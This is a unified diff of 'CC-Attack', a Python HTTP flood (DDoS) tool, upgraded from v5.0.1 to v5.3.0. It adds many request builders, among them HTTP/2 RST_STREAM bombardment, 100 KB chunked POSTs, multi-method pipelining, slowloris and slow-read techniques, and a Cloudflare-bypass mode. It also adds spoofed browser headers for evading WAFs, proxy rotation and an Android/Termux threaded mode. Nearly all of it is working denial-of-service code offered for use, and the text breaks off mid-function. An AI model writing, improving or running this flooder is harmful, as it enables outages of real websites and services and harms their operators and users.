@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 """
-CC-Attack v5.0.1 — High-Performance Edition + live stats reporter
+CC-Attack v5.3.0 — Mega+ Edition
 Author: DIDO
 Requires: pip install requests pysocks
 """
@@ -72,10 +72,25 @@ class C:
         YEL = GRN = CYN = BLU = PRP = WHT = ""
 
 
-VERSION = "5.0.1"
-BUILD   = "2026/09/26"
+VERSION = "5.3.0"
+BUILD   = "2026/09/27"
 
-# ── High-Performance tuning ─────────────────────────────────────────────────
+# ── Автодетект Termux ───────────────────────────────────────────────────────
+def _is_termux() -> bool:
+    if "ANDROID_ROOT" in os.environ or "ANDROID_DATA" in os.environ:
+        return True
+    if "com.termux" in os.environ.get("PREFIX", ""):
+        return True
+    if "termux" in platform.platform().lower():
+        return True
+    if os.path.exists("/data/data/com.termux"):
+        return True
+    return False
+
+
+IS_TERMUX = _is_termux()
+
+# ── HP tuning ───────────────────────────────────────────────────────────────
 PIPELINE_DEPTH        = 64
 KEEPALIVE_PER_SOCKET  = 10000
 SOCKET_SNDBUF         = 4194304
@@ -87,8 +102,33 @@ SEND_CHUNK            = 65536
 
 TOP_ALIVE_DEFAULT     = 2000
 
+# ── Методы ──────────────────────────────────────────────────────────────────
+HTTP_METHODS = [
+    "GET", "POST", "HEAD", "PUT", "DELETE",
+    "PATCH", "OPTIONS", "TRACE", "CONNECT",
+]
+SPECIAL_METHODS = [
+    "OVH", "RAPIDREST",
+    "CFB", "SLOWPOST", "BURST", "HTTP3",
+    # 🆕 Мега-методы
+    "GOD",       # 20 склеенных запросов
+    "POWER",     # HTTP/2 RST_STREAM бомбардировка
+    "NUCLEAR",   # POST 100 KB + chunked
+    "LASER",     # 60-байтные микро-GET
+    "SHOTGUN",   # Мультиплекс 5 методов
+    "STEALTH",   # Реалистичный браузерный запрос
+]
+ALL_METHODS = HTTP_METHODS + SPECIAL_METHODS + ["RANDOM"]
 
-# ── Fast RNG (без GIL-конкуренции) ──────────────────────────────────────────
+# ── Техники ─────────────────────────────────────────────────────────────────
+TECHNIQUES = [
+    "flood", "slow", "pipeline", "mixed", "random",
+    "slowloris", "gzip", "chunked", "range", "http2",
+    "websocket", "prewarm",
+    "turbo", "bypass", "carpet", "slowread",
+]
+
+# ── Fast RNG ────────────────────────────────────────────────────────────────
 class FastRNG:
     __slots__ = ("_pool", "_idx", "_size")
 
@@ -163,6 +203,7 @@ class Log:
 #  БАННЕР
 # ─────────────────────────────────────────────────────────────────────────────
 def print_banner() -> None:
+    mode = "THREAD-MODE" if IS_TERMUX else "MULTIPROCESSING"
     print(f"""
 {C.RED}  ██████╗ ██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
  ██╔════╝██╔════╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
@@ -170,9 +211,10 @@ def print_banner() -> None:
  ██║     ██║         ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗
  ╚██████╗╚██████╗    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
   ╚═════╝ ╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝{C.RESET}
-                    {C.YEL}v{VERSION} HP EDITION{C.RESET}  •  {C.CYN}{BUILD}{C.RESET}  •  by {C.BOLD}DIDO{C.RESET}
+                    {C.YEL}v{VERSION} MEGA+ EDITION{C.RESET}  •  {C.CYN}{BUILD}{C.RESET}  •  by {C.BOLD}DIDO{C.RESET}
 
 {C.DIM}Python {platform.python_version()}  |  {platform.system()} {platform.release()}  |  CPU: {platform.machine()} ({mp.cpu_count()} ядер){C.RESET}
+{C.DIM}Mode: {mode}{C.RESET}
 """)
 
 
@@ -221,6 +263,29 @@ _OS_MAC = ["Macintosh; Intel Mac OS X 10_15_7",
            "Macintosh; Intel Mac OS X 14_6_1"]
 _OS_LINUX = ["X11; Linux x86_64", "X11; Ubuntu; Linux x86_64"]
 
+ACCEPT_HEADERS = [
+    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\n",
+    "Accept: */*\r\nAccept-Encoding: gzip, deflate, br\r\n",
+    "Accept: application/json, text/plain, */*\r\nAccept-Encoding: gzip, deflate, br\r\n",
+]
+
+SEC_FETCH_HEADERS = [
+    "Sec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\n",
+    "Sec-Fetch-Dest: empty\r\nSec-Fetch-Mode: cors\r\nSec-Fetch-Site: same-origin\r\n",
+    "Sec-Fetch-Dest: script\r\nSec-Fetch-Mode: no-cors\r\nSec-Fetch-Site: cross-site\r\n",
+    "Sec-Fetch-Dest: image\r\nSec-Fetch-Mode: no-cors\r\nSec-Fetch-Site: same-origin\r\n",
+]
+
+REFERERS = [
+    "https://www.google.com/search?q=",
+    "https://www.google.ru/search?q=",
+    "https://yandex.ru/search/?text=",
+    "https://www.bing.com/search?q=",
+    "https://duckduckgo.com/?q=",
+    "https://vk.com/search?c[q]=",
+    "https://ok.ru/search?st.query=",
+]
+
 _UA_CACHE: list[str] = []
 _UA_CACHE_LOCK = threading.Lock()
 
@@ -241,18 +306,12 @@ def get_ua() -> str:
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-#  ЯДРО АТАКИ (оптимизированное)
+#  ЯДРО АТАКИ
 # ─────────────────────────────────────────────────────────────────────────────
 class CCHandler:
-    __slots__ = (
-        "target", "path", "port", "protocol", "proxies", "proxy_type",
-        "stop", "pipeline_depth", "keepalive", "rng", "ua_cache",
-        "stats_sent", "stats_errors", "stats_bytes",
-        "_stat_lock", "_rr", "_rr_lock",
-    )
-
     def __init__(self, target, path, port, protocol, proxies, proxy_type,
-                 stop_event,
+                 cookies, post_data, brute, stop_event,
+                 method="GET", technique="flood", slow_delay=0.5,
                  pipeline_depth=PIPELINE_DEPTH,
                  keepalive=KEEPALIVE_PER_SOCKET):
 
@@ -262,9 +321,15 @@ class CCHandler:
         self.protocol = protocol
         self.proxies = proxies
         self.proxy_type = proxy_type
+        self.cookies = cookies
+        self.post_data = post_data
+        self.brute = brute
         self.stop = stop_event
         self.pipeline_depth = max(1, min(128, pipeline_depth))
         self.keepalive = max(1, min(100000, keepalive))
+        self.method = "RANDOM" if method == "RANDOM" else method.upper()
+        self.technique = technique.lower()
+        self.slow_delay = max(0.0, slow_delay)
 
         self.rng = FastRNG(size=8192)
         self.ua_cache = [get_ua() for _ in range(64)]
@@ -272,10 +337,11 @@ class CCHandler:
         self.stats_sent = 0
         self.stats_errors = 0
         self.stats_bytes = 0
-        self._stat_lock = threading.Lock()
 
         self._rr = random.randint(0, max(0, len(proxies) - 1))
         self._rr_lock = threading.Lock()
+
+        self._sep = "&" if "?" in self.path else "?"
 
     def _stat(self, sent=0, err=0, nbytes=0):
         self.stats_sent += sent
@@ -298,6 +364,446 @@ class CCHandler:
             if 0 < port < 65536 and host:
                 return host, port
         raise ValueError("no valid proxy")
+
+    def _resolve_method(self):
+        if self.method == "RANDOM":
+            return random.choice(ALL_METHODS[:-1])
+        return self.method
+
+    # ═══ БАЗОВЫЕ МЕТОДЫ ═══════════════════════════════════════════════
+    def _build_basic(self, method: str) -> bytes:
+        m = method.upper()
+        conn = "Connection: Keep-Alive\r\n"
+        if self.cookies:
+            conn += f"Cookie: {self.cookies}\r\n"
+        ref = f"Referer: {random.choice(REFERERS)}{self.target}{self.path}\r\n"
+        ua = f"User-Agent: {get_ua()}\r\n"
+        acc = random.choice(ACCEPT_HEADERS)
+
+        if m in ("GET", "HEAD", "OPTIONS", "TRACE", "CONNECT"):
+            return (ref + ua + acc + conn + "\r\n").encode()
+
+        body = self.post_data or os.urandom(16).hex()
+        ctype = "Content-Type: application/x-www-form-urlencoded\r\n"
+        extra = "X-Requested-With: XMLHttpRequest\r\n" if m == "POST" else ""
+
+        if self.technique == "gzip":
+            import zlib
+            extra += "Content-Encoding: gzip\r\n"
+            body = zlib.compress(body.encode("utf-8")).decode("latin-1")
+        elif self.technique == "chunked":
+            extra += "Transfer-Encoding: chunked\r\n"
+            ctype = ""
+            chunks = []
+            for i in range(0, len(body), 8):
+                part = body[i:i + 8]
+                chunks.append(f"{len(part):x}\r\n{part}\r\n")
+            chunks.append("0\r\n\r\n")
+            body = "".join(chunks)
+        if self.technique == "range":
+            extra += "Range: bytes=0-1\r\n"
+
+        length_line = ""
+        if "Transfer-Encoding" not in extra:
+            length_line = f"Content-Length: {len(body)}\r\n"
+
+        return (
+            f"{m} {self.path} HTTP/1.1\r\n"
+            f"Host: {self.target}\r\n"
+            f"{acc}{ctype}{extra}{ref}{ua}"
+            f"{length_line}{conn}"
+            f"\r\n{body}\r\n\r\n"
+        ).encode()
+
+    # ═══ OVH ══════════════════════════════════════════════════════════
+    def _build_ovh(self) -> bytes:
+        ua = get_ua()
+        return (
+            f"GET {self.path}{self._sep}{random.randint(0, 271400281257)} HTTP/1.1\r\n"
+            f"User-Agent: {ua}\r\n"
+            f"Accept: */*\r\n"
+            f"Accept-Encoding: identity\r\n"
+            f"Connection: close\r\n\r\n"
+        ).encode()
+
+    # ═══ 🆕 УСИЛЕННЫЙ RAPIDREST ═══════════════════════════════════════
+    def _build_rapidrest(self) -> bytes:
+        """
+        Усиленный RAPIDREST:
+          - application/octet-stream (быстрее парсится)
+          - Accept-Encoding: identity (сервер не сжимает)
+          - Cache-Control: no-store (без кэша)
+          - Connection: keep-alive (переиспользование сокета)
+          - Случайное бинарное тело
+        """
+        body = os.urandom(32)
+        return (
+            f"POST {self.path} HTTP/1.1\r\n"
+            f"Host: {self.target}\r\n"
+            f"Content-Type: application/octet-stream\r\n"
+            f"Accept: */*\r\n"
+            f"Accept-Encoding: identity\r\n"
+            f"Cache-Control: no-store\r\n"
+            f"Content-Length: {len(body)}\r\n"
+            f"Connection: keep-alive\r\n\r\n"
+        ).encode() + body
+
+    # ═══ CFB — CloudFlare Bypass ══════════════════════════════════════
+    def _build_cfb(self) -> bytes:
+        ua = get_ua()
+        sec = random.choice(SEC_FETCH_HEADERS)
+        return (
+            f"GET {self.path}?{random.randint(0, 271400281257)} HTTP/1.1\r\n"
+            f"Host: {self.target}\r\n"
+            f"User-Agent: {ua}\r\n"
+            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
+            f"Accept-Language: en-US,en;q=0.9\r\n"
+            f"Accept-Encoding: gzip, deflate, br\r\n"
+            f"{sec}"
+            f"Connection: Keep-Alive\r\n\r\n"
+        ).encode()
+
+    # ═══ SLOWPOST ═════════════════════════════════════════════════════
+    def _build_slowpost(self) -> bytes:
+        body = "A" * 1024
+        headers = (
+            f"POST {self.path} HTTP/1.1\r\n"
+            f"Host: {self.target}\r\n"
+            f"User-Agent: {get_ua()}\r\n"
+            f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Content-Length: {len(body)}\r\n"
+            f"Connection: Keep-Alive\r\n\r\n"
+        )
+        return (headers + body).encode()
+
+    # ═══ BURST ════════════════════════════════════════════════════════
+    def _build_burst(self) -> bytes:
+        ua = get_ua()
+        rng = self.rng
+        parts = []
+        for _ in range(32):
+            parts.append(
+                f"GET {self.path}?{rng.next()} HTTP/1.1\r\n"
+                f"Host: {self.target}\r\n"
+                f"UA: {ua[:20]}\r\n"
+                f"Connection: Keep-Alive\r\n\r\n"
+            )
+        return "".join(parts).encode()
+
+    # ═══ HTTP3 ════════════════════════════════════════════════════════
+    def _build_http3(self) -> bytes:
+        ua = get_ua()
+        return (
+            f"GET {self.path}?{random.randint(0, 271400281257)} HTTP/1.1\r\n"
+            f"Host: {self.target}\r\n"
+            f"User-Agent: {ua}\r\n"
+            f"Accept: */*\r\n"
+            f"Alt-Used: {self.target}\r\n"
+            f"Connection: Keep-Alive\r\n\r\n"
+        ).encode()
+
+    # ═══ 🆕 GOD — 20 склеенных запросов ═══════════════════════════════
+    def _build_god(self) -> bytes:
+        """
+        GOD-метод: 20 минимальных GET в одном syscall.
+        Плюс минимум заголовков — 45 байт на запрос.
+        """
+        rng = self.rng
+        parts = []
+        target = self.target
+        path = self.path
+        for _ in range(20):
+            parts.append(
+                f"GET {path}?{rng.next()} HTTP/1.1\r\n"
+                f"Host: {target}\r\n\r\n"
+            )
+        return "".join(parts).encode()
+
+    # ═══ 🆕 POWER — HTTP/2 RST_STREAM бомбардировка ═══════════════════
+    def _build_power(self) -> bytes:
+        """
+        POWER: HTTP/2 preface + 50 RST_STREAM фреймов.
+        Заставляет сервер обрабатывать фреймы закрытия потоков.
+        """
+        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
+        settings = struct.pack(">BHB", 0, 0, 0x04) + struct.pack(">BHB", 0, 0, 0x00)
+        parts = [preface, settings]
+        for stream_id in range(1, 100, 2):  # нечётные = клиентские
+            rst = (struct.pack(">BHB", 0, 4, 0x03) +
+                   struct.pack(">I", stream_id) +
+                   struct.pack(">I", 0x08))  # CANCEL
+            parts.append(rst)
+        return b"".join(parts)
+
+    # ═══ 🆕 NUCLEAR — POST 100 KB + chunked ═══════════════════════════
+    def _build_nuclear(self) -> bytes:
+        """
+        NUCLEAR: огромный POST с 100 KB тела.
+        Сервер вынужден принимать и обрабатывать много данных.
+        """
+        chunk_size = 8192
+        total_chunks = 12  # 12 × 8192 ≈ 96 KB
+        parts = [
+            f"POST {self.path} HTTP/1.1\r\n"
+            f"Host: {self.target}\r\n"
+            f"User-Agent: {get_ua()}\r\n"
+            f"Content-Type: application/octet-stream\r\n"
+            f"Transfer-Encoding: chunked\r\n"
+            f"Connection: Keep-Alive\r\n\r\n"
+        ]
+        for _ in range(total_chunks):
+            chunk = os.urandom(chunk_size)
+            parts.append(f"{chunk_size:x}\r\n")
+            parts.append(chunk.decode("latin-1"))
+            parts.append("\r\n")
+        parts.append("0\r\n\r\n")
+        return "".join(parts).encode("latin-1")
+
+    # ═══ 🆕 LASER — 60-байтные микро-GET ═════════════════════════════
+    def _build_laser(self) -> bytes:
+        """
+        LASER: минимальный GET (~50 байт).
+        Максимум RPS на единицу трафика.
+        """
+        rng = self.rng
+        return (
+            f"GET /{rng.next() % 9999} HTTP/1.1\r\n"
+            f"Host:{self.target}\r\n\r\n"
+        ).encode()
+
+    # ═══ 🆕 SHOTGUN — мультиплекс 5 методов ═══════════════════════════
+    def _build_shotgun(self) -> bytes:
+        """
+        SHOTGUN: 5 разных методов в одном syscall.
+        Сложнее фильтруется WAF.
+        """
+        rng = self.rng
+        t = self.target
+        p = self.path
+        ua = get_ua()[:20]
+        parts = [
+            f"GET {p}?{rng.next()} HTTP/1.1\r\nHost:{t}\r\nUA:{ua}\r\n\r\n",
+            f"HEAD {p}?{rng.next()} HTTP/1.1\r\nHost:{t}\r\nUA:{ua}\r\n\r\n",
+            f"OPTIONS * HTTP/1.1\r\nHost:{t}\r\nUA:{ua}\r\n\r\n",
+            f"PUT {p}?{rng.next()} HTTP/1.1\r\nHost:{t}\r\nUA:{ua}\r\nContent-Length: 4\r\n\r\nAAAA",
+            f"DELETE {p}?{rng.next()} HTTP/1.1\r\nHost:{t}\r\nUA:{ua}\r\n\r\n",
+        ]
+        return "".join(parts).encode()
+
+    # ═══ 🆕 STEALTH — реалистичный браузерный запрос ══════════════════
+    def _build_stealth(self) -> bytes:
+        """
+        STEALTH: полный набор заголовков реального браузера.
+        Сложно отличить от обычного пользователя.
+        """
+        ua = get_ua()
+        sec = random.choice(SEC_FETCH_HEADERS)
+        ref = f"https://{self.target}/"
+        return (
+            f"GET {self.path}?{random.randint(0, 271400281257)} HTTP/1.1\r\n"
+            f"Host: {self.target}\r\n"
+            f"Connection: keep-alive\r\n"
+            f"Cache-Control: max-age=0\r\n"
+            f"Upgrade-Insecure-Requests: 1\r\n"
+            f"User-Agent: {ua}\r\n"
+            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n"
+            f"Accept-Encoding: gzip, deflate, br\r\n"
+            f"Accept-Language: en-US,en;q=0.9,ru;q=0.8\r\n"
+            f"{sec}"
+            f"Referer: {ref}\r\n\r\n"
+        ).encode()
+
+    # ═══ HTTP/2 upgrade ═══════════════════════════════════════════════
+    def _build_http2_upgrade(self) -> bytes:
+        ua = get_ua()
+        return (
+            f"GET {self.path}?{random.randint(0, 271400281257)} HTTP/1.1\r\n"
+            f"Host: {self.target}\r\n"
+            f"User-Agent: {ua}\r\n"
+            f"Accept: */*\r\n"
+            f"Connection: Upgrade, HTTP2-Settings\r\n"
+            f"Upgrade: h2c\r\n"
+            f"HTTP2-Settings: AAMAAABkAAQAAP__\r\n\r\n"
+        ).encode()
+
+    def _build_http2_pk(self) -> bytes:
+        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
+        settings = struct.pack(">BHB", 0, 0, 0x04) + struct.pack(">BHB", 0, 0, 0x00)
+        rst = struct.pack(">BHB", 0, 4, 0x03) + struct.pack(">I", 1) + struct.pack(">I", 0x08)
+        return preface + settings + rst
+
+    # ═══ WebSocket ════════════════════════════════════════════════════
+    def _build_websocket(self) -> bytes:
+        key = os.urandom(16).hex()
+        ua = get_ua()
+        return (
+            f"GET {self.path}?{random.randint(0, 271400281257)} HTTP/1.1\r\n"
+            f"Host: {self.target}\r\n"
+            f"User-Agent: {ua}\r\n"
+            f"Upgrade: websocket\r\n"
+            f"Connection: Upgrade\r\n"
+            f"Sec-WebSocket-Key: {key}\r\n"
+            f"Sec-WebSocket-Version: 13\r\n\r\n"
+        ).encode()
+
+    # ═══ ОДИН ЗАПРОС с учётом метода и техники ═══════════════════════
+    def _build_one(self) -> bytes:
+        m = self._resolve_method()
+        tech = self.technique
+
+        # базовые методы
+        if m == "OVH":
+            return self._build_ovh()
+        if m == "RAPIDREST":
+            return self._build_rapidrest()
+        if m == "CFB":
+            return self._build_cfb()
+        if m == "SLOWPOST":
+            return self._build_slowpost()
+        if m == "BURST":
+            return self._build_burst()
+        if m == "HTTP3":
+            return self._build_http3()
+
+        # 🆕 мега-методы
+        if m == "GOD":
+            return self._build_god()
+        if m == "POWER":
+            return self._build_power()
+        if m == "NUCLEAR":
+            return self._build_nuclear()
+        if m == "LASER":
+            return self._build_laser()
+        if m == "SHOTGUN":
+            return self._build_shotgun()
+        if m == "STEALTH":
+            return self._build_stealth()
+
+        # техники
+        if tech == "http2":
+            if random.random() < 0.5:
+                return self._build_http2_pk()
+            return self._build_http2_upgrade()
+        if tech == "websocket":
+            return self._build_websocket()
+        if tech == "carpet":
+            choice = random.random()
+            if choice < 0.4:
+                return self._build_basic("GET")
+            elif choice < 0.7:
+                return self._build_http2_upgrade()
+            else:
+                return self._build_websocket()
+        if tech == "bypass":
+            m2 = random.choice(ALL_METHODS[:-1])
+            if m2 in ("OVH", "CFB", "HTTP3"):
+                return self._build_cfb()
+            if m2 == "SLOWPOST":
+                return self._build_slowpost()
+            if m2 == "BURST":
+                return self._build_burst()
+            if m2 == "RAPIDREST":
+                return self._build_rapidrest()
+            if m2 == "GOD":
+                return self._build_god()
+            if m2 == "POWER":
+                return self._build_power()
+            if m2 == "NUCLEAR":
+                return self._build_nuclear()
+            if m2 == "LASER":
+                return self._build_laser()
+            if m2 == "SHOTGUN":
+                return self._build_shotgun()
+            if m2 == "STEALTH":
+                return self._build_stealth()
+            return self._build_basic(m2)
+
+        return self._build_basic(m)
+
+    # ═══ Пачка (pipeline) ═════════════════════════════════════════════
+    def _build_batch(self, n: int) -> bytes:
+        parts = []
+        for _ in range(n):
+            parts.append(self._build_one())
+        return b"".join(parts)
+
+    def _send_batch(self, s, batch: bytes) -> bool:
+        try:
+            CHUNK = SEND_CHUNK
+            n = len(batch)
+            if n <= CHUNK:
+                s.sendall(batch)
+            else:
+                for i in range(0, n, CHUNK):
+                    s.sendall(batch[i:i + CHUNK])
+            return True
+        except (socket.timeout, BrokenPipeError,
+                ConnectionResetError, OSError):
+            return False
+
+    def _attack_pipeline(self, s):
+        depth = self.pipeline_depth
+        ka = self.keepalive
+        sent = 0
+        while sent < ka and not self.stop.is_set():
+            batch = self._build_batch(depth)
+            if not self._send_batch(s, batch):
+                return
+            sent += depth
+            self._stat(sent=depth, nbytes=len(batch))
+
+    def _attack_single(self, s):
+        req = self._build_one()
+        try:
+            s.sendall(req)
+            self._stat(sent=1, nbytes=len(req))
+        except Exception:
+            pass
+
+    def _attack_slow(self, s):
+        req = self._build_one()
+        try:
+            for byte in req:
+                if self.stop.is_set():
+                    return
+                s.sendall(bytes([byte]))
+                if self.slow_delay > 0:
+                    time.sleep(self.slow_delay)
+            self._stat(sent=1, nbytes=len(req))
+        except Exception:
+            pass
+
+    def _attack_slowread(self, s):
+        req = self._build_basic("GET")
+        try:
+            s.sendall(req)
+            self._stat(sent=1, nbytes=len(req))
+            s.settimeout(10)
+            for _ in range(100):
+                if self.stop.is_set():
+                    return
+                try:
+                    data = s.recv(1)
+                    if not data:
+                        break
+                except socket.timeout:
+                    break
+        except Exception:
+            pass
+
+    def _attack_turbo(self, s):
+        depth = 128
+        ka = self.keepalive
+        sent = 0
+        while sent < ka and not self.stop.is_set():
+            batch = self._build_batch(depth)
+            try:
+                s.sendall(batch)
+            except (socket.timeout, BrokenPipeError,
+                    ConnectionResetError, OSError):
+                return
+            sent += depth
+            self._stat(sent=depth, nbytes=len(batch))
 
     def _open(self, host, port):
         s = socks.socksocket()
@@ -336,51 +842,6 @@ class CCHandler:
             pass
         return s
 
-    def _build_batch(self, n: int) -> bytes:
-        rng = self.rng
-        uas = self.ua_cache
-        ua_len = len(uas)
-        target = self.target
-        path = self.path
-
-        parts = []
-        append = parts.append
-        for _ in range(n):
-            rnd = rng.next()
-            ua = uas[rnd % ua_len]
-            append(
-                f"GET {path}?{rnd} HTTP/1.1\r\n"
-                f"Host: {target}\r\n"
-                f"UA: {ua[:20]}\r\n"
-                f"Connection: Keep-Alive\r\n\r\n"
-            )
-        return "".join(parts).encode()
-
-    def _send_batch(self, s, batch: bytes) -> bool:
-        try:
-            CHUNK = SEND_CHUNK
-            n = len(batch)
-            if n <= CHUNK:
-                s.sendall(batch)
-            else:
-                for i in range(0, n, CHUNK):
-                    s.sendall(batch[i:i + CHUNK])
-            return True
-        except (socket.timeout, BrokenPipeError,
-                ConnectionResetError, OSError):
-            return False
-
-    def _attack_pipeline(self, s):
-        depth = self.pipeline_depth
-        ka = self.keepalive
-        sent = 0
-        while sent < ka and not self.stop.is_set():
-            batch = self._build_batch(depth)
-            if not self._send_batch(s, batch):
-                return
-            sent += depth
-            self._stat(sent=depth, nbytes=len(batch))
-
     def run(self):
         stop = self.stop
         while not stop.is_set():
@@ -393,7 +854,30 @@ class CCHandler:
             s = None
             try:
                 s = self._open(host, port)
-                self._attack_pipeline(s)
+
+                tech = self.technique
+                if tech == "random":
+                    tech = random.choice(TECHNIQUES)
+                elif tech == "mixed":
+                    tech = random.choice(["flood", "pipeline", "gzip",
+                                          "chunked", "range",
+                                          "http2", "websocket"])
+
+                if tech == "turbo":
+                    self._attack_turbo(s)
+                elif tech == "slowread":
+                    self._attack_slowread(s)
+                elif tech in ("bypass", "carpet"):
+                    self._attack_pipeline(s)
+                elif tech == "slow":
+                    self._attack_slow(s)
+                elif tech in ("flood", "pipeline", "gzip", "chunked",
+                              "range", "http2", "websocket",
+                              "prewarm", "slowloris"):
+                    self._attack_pipeline(s)
+                else:
+                    self._attack_single(s)
+
                 try:
                     s.close()
                 except Exception:
@@ -407,60 +891,126 @@ class CCHandler:
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-#  WORKER для multiprocessing (+ поток-репортёр)
+#  WORKER: multiprocessing (Linux/Win) ИЛИ threading (Termux)
 # ─────────────────────────────────────────────────────────────────────────────
-def _proc_worker(cfg: dict, proxies: list[str],
-                 thread_count: int, period: int,
-                 result_q, stop_flag):
-    """
-    Процесс-воркер. Запускает thread_count потоков в своём GIL.
-    Каждую секунду отправляет счётчики в главный процесс.
-    """
+def _run_multiprocessing(cfg, proxies, proc_cfg, cpu_count):
+    result_q = mp.Queue()
+    stop_flag = mp.Value("b", 0)
+
+    processes = []
+    for _ in range(cpu_count):
+        p = mp.Process(
+            target=_proc_worker,
+            args=(proc_cfg, proxies, cfg["threads"], cfg["period"],
+                  result_q, stop_flag),
+            daemon=False,
+        )
+        p.start()
+        processes.append(p)
+
+    start = time.time()
+    sent_total = errors_total = bytes_total = 0
+    last_sent = 0
+    last_time = start
+
+    try:
+        while time.time() - start < cfg["period"]:
+            time.sleep(1)
+            elapsed = max(1e-6, time.time() - start)
+
+            while True:
+                try:
+                    ds, de, db, ts, te, tb = result_q.get_nowait()
+                    sent_total += ds
+                    errors_total += de
+                    bytes_total += db
+                except queue.Empty:
+                    break
+
+            now = time.time()
+            dt = now - last_time
+            inst_rps = (sent_total - last_sent) / dt if dt > 0 else 0
+            last_sent = sent_total
+            last_time = now
+
+            sys.stdout.write(
+                f"\r  {C.GRN}▶{C.RESET} {int(elapsed):>3}/{cfg['period']}s  "
+                f"| {C.CYN}RPS:{C.RESET} {inst_rps:>10.0f}  "
+                f"| {C.RED}errs:{C.RESET} {errors_total:<7}  "
+                f"| {C.YEL}MB:{C.RESET} {bytes_total / 1048576:>7.2f}"
+            )
+            sys.stdout.flush()
+    except KeyboardInterrupt:
+        Log.warn("Interrupt — stopping…")
+    finally:
+        stop_flag.value = 1
+        deadline = time.time() + 2.0
+        for p in processes:
+            remain = max(0.1, deadline - time.time())
+            p.join(timeout=remain)
+        for p in processes:
+            if p.is_alive():
+                p.terminate()
+        for p in processes:
+            if p.is_alive():
+                p.join(timeout=1)
+        print()
+
+        while True:
+            try:
+                ds, de, db, ts, te, tb = result_q.get_nowait()
+                sent_total += ds
+                errors_total += de
+                bytes_total += db
+            except queue.Empty:
+                break
+
+        total_time = max(1e-6, time.time() - start)
+        Log.ok(f"Done. Sent: {sent_total}, errors: {errors_total}, "
+               f"traffic: {bytes_total / 1048576:.2f} MB, "
+               f"avg RPS: {sent_total / total_time:.0f}")
+    return 0
+
+
+def _proc_worker(cfg, proxies, thread_count, period, result_q, stop_flag):
     stop_event = threading.Event()
 
     handler = CCHandler(
         target=cfg["target"], path=cfg["path"],
         port=cfg["port"], protocol=cfg["protocol"],
         proxies=proxies, proxy_type=cfg["proxy_type"],
+        cookies=cfg.get("cookies", ""),
+        post_data=cfg.get("post_data", ""),
+        brute=cfg.get("brute", False),
         stop_event=stop_event,
+        method=cfg.get("method", "GET"),
+        technique=cfg.get("technique", "flood"),
         pipeline_depth=cfg["pipeline"],
         keepalive=cfg["keepalive"],
     )
 
-    threads = []
     for _ in range(thread_count):
         t = threading.Thread(target=handler.run, daemon=True)
         t.start()
-        threads.append(t)
 
-    # ── 🆕 Фоновый поток-репортёр: шлёт статистику каждую секунду ──────
     stop_reporter = threading.Event()
 
     def reporter():
-        last_sent = 0
-        last_err = 0
-        last_bytes = 0
+        last_sent = last_err = last_bytes = 0
         while not stop_reporter.is_set():
             time.sleep(1.0)
-            cur_sent = handler.stats_sent
-            cur_err = handler.stats_errors
-            cur_bytes = handler.stats_bytes
-            delta_sent = cur_sent - last_sent
-            delta_err = cur_err - last_err
-            delta_bytes = cur_bytes - last_bytes
-            last_sent = cur_sent
-            last_err = cur_err
-            last_bytes = cur_bytes
+            cs = handler.stats_sent
+            ce = handler.stats_errors
+            cb = handler.stats_bytes
             try:
                 result_q.put_nowait(
-                    (delta_sent, delta_err, delta_bytes,
-                     cur_sent, cur_err, cur_bytes)
-                )
+                    (cs - last_sent, ce - last_err, cb - last_bytes,
+                     cs, ce, cb))
             except Exception:
                 pass
+            last_sent, last_err, last_bytes = cs, ce, cb
 
-    reporter_thread = threading.Thread(target=reporter, daemon=True)
-    reporter_thread.start()
+    threading.Thread(target=reporter, daemon=True).start()
 
     start = time.time()
     try:
@@ -468,19 +1018,82 @@ def _proc_worker(cfg: dict, proxies: list[str],
             if stop_flag is not None and stop_flag.value:
                 break
             time.sleep(0.5)
-    except KeyboardInterrupt:
-        pass
     finally:
-        # Финальный репорт перед выходом
         try:
             result_q.put_nowait(
-                (0, 0, 0,
-                 handler.stats_sent, handler.stats_errors, handler.stats_bytes)
-            )
+                (0, 0, 0, handler.stats_sent,
+                 handler.stats_errors, handler.stats_bytes))
         except Exception:
             pass
         stop_event.set()
         stop_reporter.set()
+
+
+def _run_threaded(cfg, proxies, cpu_count):
+    Log.warn("Termux/Android detected → using THREADED mode")
+
+    stop_event = threading.Event()
+
+    handler = CCHandler(
+        target=cfg["target"], path=cfg["path"],
+        port=cfg["port"], protocol=cfg["protocol"],
+        proxies=proxies, proxy_type=cfg["proxy_type"],
+        cookies=cfg.get("cookies", ""),
+        post_data=cfg.get("post_data", ""),
+        brute=cfg.get("brute", False),
+        stop_event=stop_event,
+        method=cfg.get("method", "GET"),
+        technique=cfg.get("technique", "flood"),
+        pipeline_depth=cfg["pipeline"],
+        keepalive=cfg["keepalive"],
+    )
+
+    total_threads = cfg["threads"]
+    started = 0
+    for _ in range(total_threads):
+        try:
+            t = threading.Thread(target=handler.run, daemon=True)
+            t.start()
+            started += 1
+        except RuntimeError as e:
+            Log.warn(f"OS limit reached (started {started}): {e}")
+            break
+
+    Log.info(f"Started {started} threads")
+
+    start = time.time()
+    last_sent = 0
+    last_time = start
+
+    try:
+        while time.time() - start < cfg["period"] and not stop_event.is_set():
+            time.sleep(1)
+            elapsed = max(1e-6, time.time() - start)
+            now = time.time()
+            dt = now - last_time
+            sent = handler.stats_sent
+            inst_rps = (sent - last_sent) / dt if dt > 0 else 0
+            last_sent = sent
